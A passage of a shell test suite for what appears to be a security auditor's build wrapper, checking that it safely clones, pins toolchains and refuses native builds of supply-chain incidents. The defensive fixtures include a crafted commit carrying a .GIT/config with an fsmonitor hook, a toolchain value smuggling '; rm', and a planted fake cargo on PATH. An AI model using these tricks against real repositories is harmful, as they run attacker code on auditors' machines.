run "$TARGET" "$WT" PATH="$T/oldgit:$FPATH" -- cargo-test --run audit_1 --src audit_1/src.git
check "... and --src may be the copy git-ro.sh copy made" sh -c "[ '$RC' = 0 ] && grep -qxF 'show: // v2' '$T/calls'"
run "$TARGET" "$SM" PATH="$T/oldgit:$FPATH" -- cargo-test --run audit_1 --src .
check "... a revision with a submodule gets the note, and the empty directory" \
  sh -c "[ '$RC' = 0 ] && grep -qxF '$SUBNOTE' '$T/out' && grep -q '^listing: .* ./vendor/sub \$' '$T/calls'"
# A commit whose tree holds a path git checkout never writes, sub/.GIT/config here (git mktree takes it).
CR=$T/craftwt
tgit init -q "$CR" && tgit -C "$CR" symbolic-ref HEAD refs/heads/main
printf '[package]\nname = "cr"\nversion = "0.1.0"\n' > "$CR/Cargo.toml"
tgit -C "$CR" add Cargo.toml && tgit -C "$CR" commit -qm plain
b=$(printf '[core]\n\tfsmonitor = %s/mark-fsmonitor\n' "$T" | tgit -C "$CR" hash-object -w --stdin)
t=$(printf '100644 blob %s\tconfig\n' "$b" | tgit -C "$CR" mktree)
t=$(printf '040000 tree %s\t.GIT\n' "$t" | tgit -C "$CR" mktree)
t=$( { tgit -C "$CR" ls-tree HEAD; printf '040000 tree %s\tsub\n' "$t"; } | tgit -C "$CR" mktree)
c=$(tgit -C "$CR" commit-tree "$t" -p HEAD -m crafted) && tgit -C "$CR" update-ref refs/heads/main "$c"
( cd "$CR" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$CR/audit_1/exec-mode"
run "$TARGET" "$CR" PATH="$T/oldgit:$FPATH" -- cargo-test --run audit_1 --src .
check "... a commit whose tree holds sub/.GIT/config: exit 3, nothing written or built" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: $c holds a path git checkout does not write: sub/.GIT/config; log ' '$T/err' && ! grep -q '^== cargo' '$T/calls' && [ -z \"\$(ls -A '$T/marks')\" ]"
settings
if [ "$ISOLATED_OK" = 1 ]; then
  run "$TARGET" "$WT" PATH="$T/oldgit:$FPATH" AUDITOR_STRICT=1 -- cargo-test --run audit_1 --src .
  check "strict mode, git 2.39.3: the source is not cloned, exit 3, nothing copied" \
    sh -c "[ '$RC' = 3 ] && grep -qxF 'target: blocker: cloning --src needs git with the May-2024 clone fixes: 2.39.4, 2.40.2, 2.41.1, 2.42.2, 2.43.4, 2.44.1, 2.45.1, or 2.46 or later — nothing was copied or built.' '$T/err' && [ -z \"\$(ls -A '$NT')\" ]"
fi
run "$TARGET" "$P" PATH="$T/oldgit:$FPATH" -- cargo-test --run audit_1 --src .
check "... while a source that is copied file by file needs no clone" sh -c "[ '$RC' = 0 ] && ! grep -q 'May-2024' '$T/out'"
# A source another user owns (git's own test knob stands for the other user): the clone keeps git's ownership
# check on (no global config, in both modes), so in default mode target.sh copies such a source through the
# plumbing instead, with a note, since a copy never runs the source repository's configured code, and strict
# mode refuses it. A source this user owns is cloned as before. Each stand-in logs every git command it runs.
REALGIT=$(command -v git)
mkdir -p "$T/owngit" "$T/othergit"
printf '#!/bin/sh\nprintf "%%s|%%s\\n" "${GIT_CONFIG_GLOBAL-unset}" "$*" >> "%s/owngit.log"\nexec "%s" "$@"\n' "$T" "$REALGIT" > "$T/owngit/git"
printf '#!/bin/sh\nprintf "%%s\\n" "$*" >> "%s/othergit.log"\nGIT_TEST_ASSUME_DIFFERENT_OWNER=1 exec "%s" "$@"\n' "$T" "$REALGIT" > "$T/othergit/git"
chmod +x "$T/owngit/git" "$T/othergit/git"
OWNNOTE=">> note: --src . belongs to another user, so git would not clone it with its ownership check on; target.sh copies the tracked files of the commit with git's read-only plumbing instead, which runs nothing the repository's config names; strict mode refuses it (Rule 11f)"
: > "$T/owngit.log"
settings FAKE_SHOW=programs/demo/src/lib.rs
run "$TARGET" "$WT" PATH="$T/owngit:$FPATH" -- cargo-test --run audit_1 --src .
check "a source this user owns: cloned as before, the clone with no global config, so git's ownership check stays on" \
  sh -c "[ '$RC' = 0 ] && grep -qxF 'show: // v2' '$T/calls' && grep -q '^/dev/null|.* clone --no-local --no-checkout ' '$T/owngit.log' && ! grep -q 'another user' '$T/out'"
check "... while target.sh's own reads in default mode take the safe-directory file" \
  grep -q '/scripts/lib/safe-directory[.]gitconfig|.* rev-parse ' "$T/owngit.log"
: > "$T/othergit.log"
run "$TARGET" "$WT" PATH="$T/othergit:$FPATH" -- cargo-test --run audit_1 --src .
check "a source another user owns: exit 0, the note, and the build sees the committed HEAD (v2)" \
  sh -c "[ '$RC' = 0 ] && grep -qxF \"$OWNNOTE\" '$T/out' && grep -qxF 'show: // v2' '$T/calls'"
check "... git ran ls-tree and cat-file --batch, and never clone" \
  sh -c "grep -q ' ls-tree -r -z --full-tree ' '$T/othergit.log' && grep -q ' cat-file --batch\$' '$T/othergit.log' && ! grep -qw clone '$T/othergit.log'"
check "... and no program or hook the repository's config names ran" test -z "$(ls -A "$T/marks")"
# A source that borrows objects (git clone --shared writes objects/info/alternates). Outside strict mode
# confine_repo takes it with a note, which prints on stdout as target.sh's own notes do, and the clone reads
# the borrowed objects; strict mode refuses it, as today. (The default-mode case needs Lane 1's confine_repo,
# lane/l1-core a36bdba.)
AL=$T/alwt
tgit clone -q --shared "$WT" "$AL" 2>/dev/null
( cd "$AL" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$AL/audit_1/exec-mode"
settings FAKE_SHOW=programs/demo/src/lib.rs
run "$TARGET" "$AL" -- cargo-test --run audit_1 --src .
check "a --src that borrows objects: exit 0, confine.sh's note on stdout and none on stderr, and the build sees HEAD (v2)" \
  sh -c "[ '$RC' = 0 ] && grep -qxF '>> note: --src borrows objects from another repository (objects/info/alternates), so its history is read from there too; strict mode refuses this (Rule 11f)' '$T/out' && [ ! -s '$T/err' ] && grep -qxF 'show: // v2' '$T/calls'"
run "$TARGET" "$AL" AUDITOR_STRICT=1 -- cargo-test --run audit_1 --src .
check "... strict mode refuses it, as today, before anything is copied" \
  sh -c "[ '$RC' = 64 ] && [ \"\$(cat '$T/err')\" = 'target: refused: --src borrows objects from another repository (objects/info/alternates); audit a full copy: .' ] && [ -z \"\$(ls -A '$NT')\" ]"
settings
# Strict mode reads nothing of a checkout another user owns, so today's refusal comes at its first read, the
# check that git tracks nothing under the run directory.
run "$TARGET" "$WT" PATH="$T/othergit:$FPATH" AUDITOR_STRICT=1 -- cargo-test --run audit_1 --src .
check "strict mode, a source another user owns: refused, as today, before anything is copied" \
  sh -c "[ '$RC' = 64 ] && [ \"\$(cat '$T/err')\" = 'target: refused: git cannot tell whether --run is tracked: audit_1' ] && [ -z \"\$(ls -A '$NT')\" ] && ! grep -qw clone '$T/othergit.log'"
settings
# Tools.
for pair in "cargo-test:cargo" "build-sbf:cargo" "anchor-build:anchor" "npm-ci:npm"; do
  run "$TARGET" "$WT" PATH="$SPATH" -- "${pair%%:*}" --run audit_1 --src .
  check "${pair%%:*} without ${pair#*:}: exit 3 before anything is copied" \
    sh -c "[ '$RC' = 3 ] && grep -qxF 'target: blocker: ${pair#*:} is not on PATH, so ${pair%%:*} cannot run here — nothing was copied or built.' '$T/err' && [ -z \"\$(ls -A '$NT')\" ]"
done
settings FAKE_RUSTUP_DEFAULT=none
run "$TARGET" "$WT" -- cargo-test --run audit_1 --src .
check "no rustup default to pin: exit 3" sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: no Rust toolchain to pin: set RUSTUP_TOOLCHAIN or a rustup default' '$T/err'"
run "$TARGET" "$WT" RUSTUP_TOOLCHAIN=1.85.0 -- cargo-test --run audit_1 --src .
check "the caller's RUSTUP_TOOLCHAIN is kept, and rustup is not asked" \
  sh -c "[ '$RC' = 0 ] && ! grep -q '^== rustup' '$T/calls' && grep -qxF 'env: RUSTUP_TOOLCHAIN=1.85.0' '$T/calls' && ! grep -q 'rust-toolchain' '$T/out'"
settings
# Outside strict mode, with no RUSTUP_TOOLCHAIN from the caller, the plain channel the copy's top-level
# rust-toolchain (else rust-toolchain.toml) names is pinned when rustup has it installed; otherwise the build
# keeps rustup's default. A note says which, and a toolchain given by path is never taken. $T/tcwt is not a
# repository: a crate and a rust-toolchain.toml with a comment, a multi-line array and a profile.
TW=$T/tcwt
mkdir -p "$TW/src"
printf '[package]\nname = "tc"\nversion = "0.1.0"\n' > "$TW/Cargo.toml"
printf '# pinned\n[toolchain]\nchannel = "1.79.0"\ncomponents = [\n  "rustfmt",\n  "clippy",\n]\nprofile = "minimal"\n' > "$TW/rust-toolchain.toml"
( cd "$TW" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$TW/audit_1/exec-mode"
settings FAKE_RUSTUP_INSTALLED="1.79.0 nightly-2024-01-01"
run "$TARGET" "$TW" -- cargo-test --run audit_1 --src .
check "a rust-toolchain.toml pinning 1.79.0, which rustup has: exit 0, a note, and the cargo steps pinned to it" \
  sh -c "[ '$RC' = 0 ] && grep -qxF \">> note: the copy's rust-toolchain.toml pins 1.79.0; building with it\" '$T/out'"
check "... cargo fetch and cargo test get RUSTUP_TOOLCHAIN=1.79.0, after rustup is asked whether it has it" calls_are \
  "rustup default|rustup which --toolchain 1.79.0 cargo|cargo fetch --manifest-path $S/src/Cargo.toml|cargo test --offline --workspace|"
check "... (the pin)" in_blocks '^== cargo (fetch|test)' '^env: RUSTUP_TOOLCHAIN=1[.]79[.]0$'
settings
run "$TARGET" "$TW" -- cargo-test --run audit_1 --src .
check "... which rustup has not installed: exit 0, a note, and rustup's default" \
  sh -c "[ '$RC' = 0 ] && grep -qxF '>> note: the copy pins 1.79.0, which rustup has not installed; building with stable-fake (rustup toolchain install 1.79.0 adds it)' '$T/out'"
check "... (the default)" in_blocks '^== cargo (fetch|test)' '^env: RUSTUP_TOOLCHAIN=stable-fake$'
printf 'nightly-2024-01-01\n' > "$TW/rust-toolchain"
settings FAKE_RUSTUP_INSTALLED="1.79.0 nightly-2024-01-01"
run "$TARGET" "$TW" -- cargo-test --run audit_1 --src .
check "a one-line rust-toolchain beside it wins, as rustup reads it first" \
  sh -c "[ '$RC' = 0 ] && grep -qxF \">> note: the copy's rust-toolchain pins nightly-2024-01-01; building with it\" '$T/out' && ! grep -q 'rust-toolchain.toml' '$T/out'"
rm -f "$TW/rust-toolchain"
for body in '[toolchain]\nchannel = "1.79.0"\npath = "/opt/toolchain"\n' '[toolchain]\nchannel = "1.79.0; rm"\n' 'toolchain = { channel = "1.79.0" }\n'; do
  printf "$body" > "$TW/rust-toolchain.toml"
  run "$TARGET" "$TW" -- cargo-test --run audit_1 --src .
  check "a rust-toolchain.toml holding '$(printf "$body" | tr '\n' ' ')': not taken, a note, rustup's default, and rustup not asked about it" \
    sh -c "[ '$RC' = 0 ] && grep -qxF \">> note: the copy's rust-toolchain.toml names a toolchain by path, or no plain channel, which target.sh does not take; building with stable-fake\" '$T/out' && ! grep -q '^== rustup which' '$T/calls'"
done
printf '[toolchain]\nchannel = "1.79.0"\n' > "$TW/rust-toolchain.toml"
run "$TARGET" "$TW" RUSTUP_TOOLCHAIN=1.85.0 -- cargo-test --run audit_1 --src .
check "... and with RUSTUP_TOOLCHAIN from the caller the file is not read" \
  sh -c "[ '$RC' = 0 ] && ! grep -q 'rust-toolchain' '$T/out' && grep -qxF 'env: RUSTUP_TOOLCHAIN=1.85.0' '$T/calls'"
if [ "$ISOLATED_OK" = 1 ]; then
  run "$TARGET" "$TW" AUDITOR_STRICT=1 -- cargo-test --run audit_1 --src .
  check "... nor in strict mode" sh -c "[ '$RC' = 0 ] && ! grep -q 'rust-toolchain' '$T/out' && ! grep -q '^== rustup which' '$T/calls'"
fi
settings
# Where it runs: TMPDIR with a trailing slash, a TMPDIR inside the working directory, the installation inside
# it, and PATH entries inside it.
rm -rf "$NT" "$T/calls"; mkdir -p "$NT"; : > "$T/calls"
( cd "$WT" && env -i HOME="$CLEANHOME" PATH="$FPATH" TMPDIR="$NT/" "${SHELLS[0]}" "$TARGET" cargo-test --run audit_1 --src . ) >"$T/out" 2>"$T/err" </dev/null
RC=$?
check "a TMPDIR ending in / works, and the scratch path has no //" \
  sh -c "[ '$RC' = 0 ] && grep -q '^cwd: $NT/auditor-target[.]' '$T/calls' && ! grep -q '^cwd: .*//' '$T/calls'"
mkdir -p "$WT/tmp-inside"
run "$TARGET" "$WT" TMPDIR="$WT/tmp-inside" -- cargo-test --run audit_1 --src .
check "a TMPDIR inside the working directory is refused before anything is made there" sh -c "[ '$RC' = 64 ] && grep -qxF 'target: refused: TMPDIR lies inside the working directory; point it outside the tree under audit' '$T/err' && [ ! -s '$T/out' ] && [ -z \"\$(ls -A '$WT/tmp-inside')\" ]"
rmdir "$WT/tmp-inside"
run "$TARGET" "$ROOT" -- cargo-test --run audit_1 --src .
check "an installation inside the working directory is refused" sh -c "[ '$RC' = 64 ] && grep -q '^target: refused: the installation lies inside the working directory' '$T/err'"
mkdir -p "$WT/.bin"
printf '#!/bin/sh\ntouch "%s/marks/wt-cargo"\nexit 0\n' "$T" > "$WT/.bin/cargo"
chmod +x "$WT/.bin/cargo"
run "$TARGET" "$WT" PATH="$WT/.bin:$FPATH" -- cargo-test --run audit_1 --src .
check "a cargo in a PATH entry inside the working directory never runs" sh -c "[ '$RC' = 0 ] && [ ! -e '$T/marks/wt-cargo' ] && grep -q '^== cargo test' '$T/calls'"
rm -rf "$WT/.bin"
check "no target.sh run ran a program or hook the source repository's config names" test -z "$(ls -A "$T/marks")"
# A session started below the top level of a repository, in programs/demo: outside strict mode --src . clones
# that repository, at its HEAD, as confine_repo . takes it, and --dir stays a path from its top; the log says
# which directory of it the session is in. Strict mode copies the directory file by file, as before.
SUB=$WT/programs/demo
( cd "$SUB" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$SUB/audit_1/exec-mode"
settings FAKE_SHOW=programs/demo/src/lib.rs
run "$TARGET" "$SUB" -- cargo-test --run audit_1 --src .
check "a session in programs/demo: --src . copies the repository at its top, at HEAD (v2)" \
  sh -c "[ '$RC' = 0 ] && grep -qxF 'show: // v2' '$T/calls'"
check "... and builds at the copy's top" calls_are "rustup default|cargo fetch --manifest-path $S/src/Cargo.toml|cargo test --offline --workspace|"
log=$(sed -n 's/.*; log \(audit_1\/exec\/cargo-test-[0-9]*[.]log\).*/\1/p' "$T/out")
check "... and its log says which directory of it the session is in" \
  grep -qE '^>> the copy: [.] at [0-9a-f]{40}; the working directory is programs/demo in it$' "$SUB/$log"
run "$TARGET" "$SUB" -- cargo-test --run audit_1 --src . --dir programs/demo
check "... --dir is a path from the copy's top" \
  calls_are "rustup default|cargo fetch --manifest-path $S/src/programs/demo/Cargo.toml|cargo test --offline --workspace|"
if [ "$ISOLATED_OK" = 1 ]; then
  run "$TARGET" "$SUB" AUDITOR_STRICT=1 -- cargo-test --run audit_1 --src .
  check "strict mode, the same session: the directory is copied file by file, as before" \
    sh -c "[ '$RC' = 0 ] && grep -qxF 'show: ' '$T/calls'"
fi
rm -rf "$SUB/audit_1"
settings

# =================================================================================================
# target.sh in an incident's run directory: INCIDENTS.json must give the root cause, and nothing of a run
# that records a supply_chain_or_ci incident is built natively, nor anything else of the working directory.
# =================================================================================================
IJ=$WT/incident_1/INCIDENTS.json
printf 'native\n' > "$WT/incident_1/exec-mode"
cp "$WT/audit_1/patches/F-1.patch" "$WT/incident_1/patches/INC-1.2.patch"
cp "$WT/audit_1/patches/F-1.patch" "$WT/incident_1/patches/INC-1.1.patch"
run "$TARGET" "$WT" -- build-sbf --run incident_1 --src .
check "an incident run without INCIDENTS.json: exit 3, nothing copied" \
  sh -c "[ '$RC' = 3 ] && grep -qxF \"target: blocker: incident_1/INCIDENTS.json is missing: an incident's code is built only once incident_1/INCIDENTS.json records its root_cause_class (OUTPUT-RULES.md Rule 11a, references/detection-response/incidents-schema.md) — nothing was copied or built.\" '$T/err' && [ ! -s '$T/calls' ] && [ -z \"\$(ls -A '$NT')\" ]"
for bad in 'not json|cannot be read as JSON' '{"incidents": {}}|holds no incidents list' '{"incidents": []}|records no incident' \
  '{"incidents": [{"id": "INC-1.1"}]}|gives an incident no root_cause_class from incidents-schema.md'; do
  printf '%s\n' "${bad%%|*}" > "$IJ"
  run "$TARGET" "$WT" -- build-sbf --run incident_1 --src .
  check "INCIDENTS.json that ${bad#*|}: exit 3, nothing copied" sh -c "[ '$RC' = 3 ] && grep -qF 'incident_1/INCIDENTS.json ${bad#*|}: ' '$T/err' && [ ! -s '$T/calls' ]"
done
printf '{"incidents": [{"id": "INC-1.1", "root_cause_class": "code_flaw"}]}\n' > "$IJ"
run "$TARGET" "$WT" -- build-sbf --run incident_1 --src .
check "an incident whose root cause is a code flaw builds natively" test "$RC" = 0
printf '{"incidents": [{"id": "INC-1.1", "root_cause_class": "supply_chain_or_ci"}, {"id": "INC-1.2", "root_cause_class": "code_flaw"}]}\n' > "$IJ"
run "$TARGET" "$WT" -- build-sbf --run incident_1 --src .
check "native mode where an incident's root cause is supply_chain_or_ci: exit 3, nothing copied" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: incident_1/INCIDENTS.json records an incident whose root_cause_class is supply_chain_or_ci, and such an incident.s code is never built natively' '$T/err' && [ ! -s '$T/calls' ]"
run "$TARGET" "$WT" -- build-sbf --run incident_1 --src . --patch incident_1/patches/INC-1.1.patch
check "--patch of that incident: exit 3 as well" sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: the root_cause_class of INC-1.1 is supply_chain_or_ci' '$T/err'"
# A patch of another incident builds the same tree, so natively every incident of the run counts.
run "$TARGET" "$WT" -- build-sbf --run incident_1 --src . --patch incident_1/patches/INC-1.2.patch
check "--patch of another incident of the run, a code flaw: natively the whole run counts, exit 3, nothing copied" \
  sh -c "[ '$RC' = 3 ] && grep -qxF '>> incident INC-1.2: root_cause_class code_flaw (incident_1/INCIDENTS.json)' '$T/out' && grep -qxF \"target: blocker: incident_1/INCIDENTS.json records an incident whose root_cause_class is supply_chain_or_ci, and such an incident's code is never built natively (OUTPUT-RULES.md Rule 11a), nor is a patch of INC-1.2, which builds the same tree; run it in isolated mode — nothing was copied or built.\" '$T/err' && [ ! -s '$T/calls' ] && [ -z \"\$(ls -A '$NT')\" ]"
printf '{"incidents": [{"id": "INC-1.1"}, {"id": "INC-1.2", "root_cause_class": "code_flaw"}]}\n' > "$IJ"
run "$TARGET" "$WT" -- build-sbf --run incident_1 --src . --patch incident_1/patches/INC-1.2.patch
check "... and natively another incident with no root cause recorded stops it as well: exit 3, nothing copied" \
  sh -c "[ '$RC' = 3 ] && grep -qF 'target: blocker: incident_1/INCIDENTS.json gives an incident no root_cause_class from incidents-schema.md: ' '$T/err' && [ ! -s '$T/calls' ]"
printf '{"incidents": [["INC-1.1", "supply_chain_or_ci"], {"id": "INC-1.2", "root_cause_class": "code_flaw"}]}\n' > "$IJ"
run "$TARGET" "$WT" -- build-sbf --run incident_1 --src . --patch incident_1/patches/INC-1.2.patch
check "... and so does an incident that is not an object: exit 3, nothing copied" \
  sh -c "[ '$RC' = 3 ] && grep -qF 'target: blocker: incident_1/INCIDENTS.json holds an incident that is not an object: ' '$T/err' && [ ! -s '$T/calls' ]"
printf '{"incidents": [{"id": "INC-1.1", "root_cause_class": "unknown"}, {"id": "INC-1.2", "root_cause_class": "code_flaw"}]}\n' > "$IJ"
run "$TARGET" "$WT" -- build-sbf --run incident_1 --src . --patch incident_1/patches/INC-1.2.patch
check "--patch of a code flaw in a run with no supply_chain_or_ci incident builds natively" \
  sh -c "[ '$RC' = 0 ] && grep -qxF '>> incident INC-1.2: root_cause_class code_flaw (incident_1/INCIDENTS.json)' '$T/out'"
if [ "$ISOLATED_OK" = 1 ]; then
  printf '{"incidents": [{"id": "INC-1.1", "root_cause_class": "supply_chain_or_ci"}, {"id": "INC-1.2", "root_cause_class": "code_flaw"}]}\n' > "$IJ"
  run "$TARGET" "$WT" AUDITOR_EXEC_MODE=isolated -- build-sbf --run incident_1 --src .
  check "isolated mode builds a supply_chain_or_ci incident's code" test "$RC" = 0
  run "$TARGET" "$WT" AUDITOR_EXEC_MODE=isolated -- build-sbf --run incident_1 --src . --patch incident_1/patches/INC-1.2.patch
  check "... and a patch of another incident of that run" test "$RC" = 0
fi
# Natively an incident recorded in any run directory the auditor made in the working directory counts, whatever
# --run names: every --src is the working tree or a copy of it. audit_1 (exec-mode native) builds while
# incident_1 records the incidents; incident_2, made beside it, holds an INCIDENTS.json of each kind below, or
# none. Only such a run directory counts (incident_<n>, with the .gitignore of exactly * rundir.sh writes):
# incident_1.old (a run moved aside), a client's Incident_Response/, incident_4/ without that .gitignore and
# incident_3, a link, are passed over, with a note, and incident_notes.md is a file.
XRUN='so nothing from this working directory is built natively, for an audit run or an incident run (OUTPUT-RULES.md Rule 11a); run it in isolated mode — nothing was copied or built.'
XREAD='nothing from this working directory is built natively until every incident_*/INCIDENTS.json in it records the root_cause_class of each of its incidents (OUTPUT-RULES.md Rule 11a, references/detection-response/incidents-schema.md) — nothing was copied or built.'
XLIST='the working directory cannot be listed, so target.sh cannot tell whether an incident_* directory in it records a supply_chain_or_ci incident, and nothing from it is built natively until it can be listed (OUTPUT-RULES.md Rule 11a) — nothing was copied or built.'
printf '{"incidents": [{"id": "INC-1.1", "root_cause_class": "supply_chain_or_ci"}, {"id": "INC-1.2", "root_cause_class": "code_flaw"}]}\n' > "$IJ"
for src in . audit_1/src.git; do
  run "$TARGET" "$WT" -- build-sbf --run audit_1 --src "$src" --patch audit_1/patches/F-1.patch
  check "natively, audit_1's build (--src $src, its own patch) while incident_1 records a supply_chain_or_ci incident: exit 3, nothing copied" \
    sh -c "[ '$RC' = 3 ] && grep -qxF 'target: blocker: incident_1/INCIDENTS.json records an incident whose root_cause_class is supply_chain_or_ci, $XRUN' '$T/err' && [ ! -s '$T/calls' ] && [ -z \"\$(ls -A '$NT')\" ]"
done
for act in cargo-test npm-ci; do
  run "$TARGET" "$WT" -- "$act" --run audit_1 --src .
  check "... and $act as well" sh -c "[ '$RC' = 3 ] && grep -qF 'incident_1/INCIDENTS.json records an incident whose root_cause_class is supply_chain_or_ci, so nothing' '$T/err' && [ ! -s '$T/calls' ]"
done
if [ "$ISOLATED_OK" = 1 ]; then
  run "$TARGET" "$WT" AUDITOR_EXEC_MODE=isolated -- build-sbf --run audit_1 --src .
  check "isolated mode builds audit_1 while incident_1 records a supply_chain_or_ci incident" test "$RC" = 0
fi
( cd "$WT" && "$ROOT/scripts/rundir.sh" new incident ) >/dev/null || ko "rundir.sh could not make incident_2"
IJ2=$WT/incident_2/INCIDENTS.json
printf '{"incidents": [{"id": "INC-1.2", "root_cause_class": "code_flaw"}]}\n' > "$IJ"
run "$TARGET" "$WT" -- build-sbf --run incident_1 --src . --patch incident_1/patches/INC-1.2.patch
check "natively, an incident run of a code flaw builds while incident_2 holds no INCIDENTS.json" \
  sh -c "[ '$RC' = 0 ] && grep -qxF '>> incident INC-1.2: root_cause_class code_flaw (incident_1/INCIDENTS.json)' '$T/out'"
printf '{"incidents": [{"id": "INC-2.1", "root_cause_class": "supply_chain_or_ci"}]}\n' > "$IJ2"
run "$TARGET" "$WT" -- build-sbf --run incident_1 --src . --patch incident_1/patches/INC-1.2.patch
check "... and stops, exit 3 with nothing copied, once incident_2 records a supply_chain_or_ci incident" \
  sh -c "[ '$RC' = 3 ] && grep -qxF 'target: blocker: incident_2/INCIDENTS.json records an incident whose root_cause_class is supply_chain_or_ci, $XRUN' '$T/err' && [ ! -s '$T/calls' ] && [ -z \"\$(ls -A '$NT')\" ]"
while IFS='|' read -r body want; do
  [ -n "$body" ] || continue
  printf '%s\n' "$body" > "$IJ2"
  run "$TARGET" "$WT" -- cargo-test --run audit_1 --src .
  case "$want" in
    builds) check "natively, audit_1 builds while incident_2's INCIDENTS.json holds $body" test "$RC" = 0 ;;
    *) check "natively, incident_2's INCIDENTS.json that $want stops audit_1's build: exit 3, nothing copied" \
         sh -c "[ '$RC' = 3 ] && grep -qxF 'target: blocker: incident_2/INCIDENTS.json $want: $XREAD' '$T/err' && [ ! -s '$T/calls' ]" ;;
  esac
done <<'CASES'
{"schema": "auditor-incidents/1", "incidents": [], "ruled_out": [{"verdict": "benign", "subject": "x", "reason": "y"}]}|builds
{"incidents": [{"id": "INC-2.1", "root_cause_class": "unknown"}, {"id": "INC-2.2", "root_cause_class": "off_chain"}]}|builds
not json|cannot be read as JSON
{"incidents": {}}|holds no incidents list
{"incidents": [{"id": "INC-2.1"}]}|gives an incident no root_cause_class from incidents-schema.md
{"incidents": [["INC-2.1", "supply_chain_or_ci"]]}|holds an incident that is not an object
CASES
printf '{"incidents": [{"id": "INC-2.1", "root_cause_class": "code_flaw"}]}\n' > "$T/incidents-elsewhere.json"
rm -f "$IJ2"
ln -s "$T/incidents-elsewhere.json" "$IJ2"
run "$TARGET" "$WT" -- cargo-test --run audit_1 --src .
check "natively, an INCIDENTS.json in incident_2 that is a symbolic link stops audit_1's build: exit 3" \
  sh -c "[ '$RC' = 3 ] && grep -qxF 'target: blocker: incident_2/INCIDENTS.json is not a regular file: $XREAD' '$T/err' && [ ! -s '$T/calls' ]"
rm -f "$IJ2"
if [ "$(id -u)" != 0 ]; then
  chmod 000 "$WT/incident_2"
  run "$TARGET" "$WT" -- cargo-test --run audit_1 --src .
  chmod 700 "$WT/incident_2"
  check "natively, an incident_2 that cannot be searched stops audit_1's build: exit 3" \
    sh -c "[ '$RC' = 3 ] && grep -qxF 'target: blocker: incident_2/INCIDENTS.json cannot be read: $XREAD' '$T/err' && [ ! -s '$T/calls' ]"
fi
SCJ='{"incidents": [{"id": "INC-1.1", "root_cause_class": "supply_chain_or_ci"}]}'
PASSED='>> note: the incident rule counts only the run directories the auditor made (incident_<n>, with a .gitignore of exactly *), so it passed over'
mkdir -p "$WT/incident_1.old" "$WT/Incident_Response" "$WT/incident_4" "$T/elsewhere-run"
printf '%s\n' "$SCJ" > "$WT/incident_1.old/INCIDENTS.json"
printf '{"cases": [{"ticket": "IR-7"}]}\n' > "$WT/Incident_Response/INCIDENTS.json"
printf '%s\n' "$SCJ" > "$WT/incident_4/INCIDENTS.json"
printf '%s\n' "$SCJ" > "$T/elsewhere-run/INCIDENTS.json" && printf '*\n' > "$T/elsewhere-run/.gitignore"
ln -s "$T/elsewhere-run" "$WT/incident_3"
printf 'notes\n' > "$WT/incident_notes.md"
run "$TARGET" "$WT" -- cargo-test --run audit_1 --src .
check "natively, a run moved aside, a client's Incident_Response/, an incident_4/ rundir.sh did not make and a link count for nothing: exit 0, and a note names them" \
  sh -c "[ '$RC' = 0 ] && grep -qxF '$PASSED Incident_Response/INCIDENTS.json, incident_1.old/INCIDENTS.json, incident_3/INCIDENTS.json, incident_4/INCIDENTS.json (Rule 11a)' '$T/out' && grep -q '^== cargo test' '$T/calls'"
rm -rf "$WT/incident_1.old" "$WT/Incident_Response" "$WT/incident_4" "$WT/incident_3"
run "$TARGET" "$WT" -- cargo-test --run audit_1 --src .
check "... while a file named incident_notes.md, and incident_2 without INCIDENTS.json, count for nothing, and get no note" \
  sh -c "[ '$RC' = 0 ] && ! grep -q 'incident rule' '$T/out'"
# An archive, which no repository tracks: a client's Incident_Response/ in another schema is passed over there too.
mkdir -p "$P/Incident_Response"
printf '{"cases": []}\n' > "$P/Incident_Response/INCIDENTS.json"
run "$TARGET" "$P" -- cargo-test --run audit_1 --src .
check "natively, in a tree that is not a repository, a client's Incident_Response/INCIDENTS.json in another schema: exit 0, with the note" \
  sh -c "[ '$RC' = 0 ] && grep -qxF '$PASSED Incident_Response/INCIDENTS.json (Rule 11a)' '$T/out'"
if [ "$ISOLATED_OK" = 1 ]; then
  run "$TARGET" "$P" AUDITOR_STRICT=1 -- cargo-test --run audit_1 --src .
  check "... and strict mode builds it isolated, with no note, as the incident rule applies natively only" \
    sh -c "[ '$RC' = 0 ] && ! grep -q 'incident rule' '$T/out'"
fi
rm -rf "$P/Incident_Response" "$T/elsewhere-run"
run "$TARGET" "$WT" PATH="$T/fake:$T/sys-nopy" -- cargo-test --run audit_1 --src .
check "natively without python3, an INCIDENTS.json in the working directory: exit 3 before anything is copied" \
  sh -c "[ '$RC' = 3 ] && grep -qxF 'target: blocker: python3 is not on PATH, so target.sh cannot tell whether incident_1 holds an INCIDENTS.json, or read the root_cause_class one records (OUTPUT-RULES.md Rule 11a) — nothing was copied or built.' '$T/err' && [ -z \"\$(ls -A '$NT')\" ]"
if [ "$ISOLATED_OK" = 1 ]; then
  printf '{"incidents": [{"id": "INC-2.1", "root_cause_class": "supply_chain_or_ci"}]}\n' > "$IJ2"
  run "$TARGET" "$WT" AUDITOR_EXEC_MODE=isolated -- cargo-test --run audit_1 --src .
  check "isolated mode builds audit_1 while incident_2 records a supply_chain_or_ci incident" test "$RC" = 0
fi
# Only python3 tells that an INCIDENTS.json is missing, so in a run directory the auditor made a stat that fails
# for another reason stops the build: a path past PATH_MAX (1024 bytes on macOS, 4096 on Linux) hides no run. In
# a working directory PATH_MAX-22 bytes long incident_1/INCIDENTS.json lies past it, and so does the .gitignore
# that says whose the directory is, which then counts as the auditor's. In one PATH_MAX-200 bytes long, a run
# moved aside under a long name, whose INCIDENTS.json (a name of 190 bytes) or which itself (230) lies past it,
# is passed over, since no run directory has such a name, and so are directories spelled INCIDENT_2 and
# Incident_2, which rundir.sh never makes. Each file is written through a relative path and records a
# supply_chain_or_ci incident. A working directory that cannot be listed stops the build too.
PM=$(getconf PATH_MAX / 2>/dev/null)
case "$PM" in ''|*[!0-9]*) PM=1024 ;; esac
long() { printf '%*s' "$1" '' | tr ' ' "$2"; }
# deep_wt <length>: prints a new directory below $T whose physical path is <length> bytes, holding a cargo
